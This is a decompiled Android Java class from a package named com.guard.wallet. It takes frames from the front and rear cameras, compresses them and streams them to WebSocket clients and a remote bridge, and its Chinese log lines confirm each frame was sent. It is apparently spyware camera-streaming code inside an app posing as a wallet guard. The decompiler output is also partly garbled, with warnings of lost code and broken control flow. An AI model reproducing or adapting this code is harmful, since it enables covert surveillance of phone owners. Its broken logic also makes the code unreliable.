package p010m;

import a1.AbstractC0026q;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.Image;
import android.media.ImageReader;
import android.util.Log;
import com.guard.wallet.bridge.C0177a;
import com.guard.wallet.server.C0231c;
import com.guard.wallet.utils.AbstractC0251g;
import e1.InterfaceC0273b;
import java.nio.ByteBuffer;
import java.util.Iterator;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;

/* renamed from: m.f */
/* loaded from: classes.dex */
public final class C0399f implements ImageReader.OnImageAvailableListener {

    /* renamed from: a */
    public final int f803a;

    public C0399f(int i2) {
        this.f803a = i2;
    }

    /* JADX WARN: Code restructure failed: missing block: B:114:0x0073, code lost:
    
        if ((r1 != null && r1.f194w.get()) != false) goto L29;
     */
    /* JADX WARN: Code restructure failed: missing block: B:12:0x003e, code lost:
    
        if ((r1 != null && r1.f194w.get()) != false) goto L29;
     */
    /* JADX WARN: Removed duplicated region for block: B:16:0x007f  */
    @Override // android.media.ImageReader.OnImageAvailableListener
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onImageAvailable(ImageReader imageReader) {
        boolean z2;
        Image acquireLatestImage = imageReader.acquireLatestImage();
        if (acquireLatestImage != null) {
            boolean z3 = false;
            int i2 = this.f803a;
            if (Objects.equals(0, Integer.valueOf(i2))) {
                if (Integer.valueOf(C0231c.m511G().f297A.size()).intValue() <= 0) {
                    C0177a c0177a = AbstractC0026q.f60f;
                }
                z2 = true;
                if (z2) {
                    Bitmap bitmap = null;
                    try {
                        ByteBuffer buffer = acquireLatestImage.getPlanes()[0].getBuffer();
                        int capacity = buffer.capacity();
                        byte[] bArr = new byte[capacity];
                        buffer.get(bArr);
                        bitmap = BitmapFactory.decodeByteArray(bArr, 0, capacity, null);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("BitmapUtils", e2);
                    }
                    byte[] M0 = AbstractC0251g.M0(bitmap, 0.8f, 80);
                    if (Objects.equals(0, Integer.valueOf(i2))) {
                        if (Integer.valueOf(C0231c.m511G().f297A.size()).intValue() > 0) {
                            C0231c m511G = C0231c.m511G();
                            m511G.getClass();
                            if (M0 != null) {
                                try {
                                    if (M0.length > 0) {
                                        ConcurrentLinkedQueue concurrentLinkedQueue = m511G.f297A;
                                        if (!concurrentLinkedQueue.isEmpty()) {
                                            Iterator it = concurrentLinkedQueue.iterator();
                                            while (it.hasNext()) {
                                                ((InterfaceC0273b) it.next()).mo746a(M0);
                                            }
                                        }
                                    }
                                } catch (Exception e3) {
                                    AbstractC0026q.m186s("MyWebSocketServer", e3);
                                }
                            }
                            Log.d("m.f", "前置摄像头画面发送完成");
                        }
                        C0177a c0177a2 = AbstractC0026q.f60f;
                        if (c0177a2 != null && c0177a2.f194w.get()) {
                            if (M0 != null && M0.length > 0) {
                                C0177a c0177a3 = AbstractC0026q.f60f;
                                if (c0177a3 != null && c0177a3.f194w.get()) {
                                    AbstractC0026q.f60f.m336B(M0);
                                }
                            }
                            Log.d("m.f", "前置摄像头画面发送完成");
                        }
                    }
                    if (Objects.equals(1, Integer.valueOf(i2))) {
                        if (Integer.valueOf(C0231c.m511G().f298B.size()).intValue() > 0) {
                            C0231c m511G2 = C0231c.m511G();
                            m511G2.getClass();
                            if (M0 != null) {
                                try {
                                    if (M0.length > 0) {
                                        ConcurrentLinkedQueue concurrentLinkedQueue2 = m511G2.f298B;
                                        if (!concurrentLinkedQueue2.isEmpty()) {
                                            Iterator it2 = concurrentLinkedQueue2.iterator();
                                            while (it2.hasNext()) {
                                                ((InterfaceC0273b) it2.next()).mo746a(M0);
                                            }
                                        }
                                    }
                                } catch (Exception e4) {
                                    AbstractC0026q.m186s("MyWebSocketServer", e4);
                                }
                            }
                            Log.d("m.f", "后置摄像头画面发送完成");
                        }
                        C0177a c0177a4 = AbstractC0026q.f61g;
                        if (c0177a4 != null && c0177a4.f194w.get()) {
                            if (M0 != null && M0.length > 0) {
                                C0177a c0177a5 = AbstractC0026q.f61g;
                                if (c0177a5 != null && c0177a5.f194w.get()) {
                                    z3 = true;
                                }
                                if (z3) {
                                    AbstractC0026q.f61g.m336B(M0);
                                }
                            }
                            Log.d("m.f", "后置摄像头画面发送完成");
                        }
                    }
                    AbstractC0251g.J0(bitmap);
                }
                acquireLatestImage.close();
            }
            if (Objects.equals(1, Integer.valueOf(i2))) {
                if (Integer.valueOf(C0231c.m511G().f298B.size()).intValue() <= 0) {
                    C0177a c0177a6 = AbstractC0026q.f61g;
                }
                z2 = true;
                if (z2) {
                }
                acquireLatestImage.close();
            }
            Log.d("m.f", "不需要发送摄像头画面");
            z2 = false;
            if (z2) {
            }
            acquireLatestImage.close();
        }
    }
}
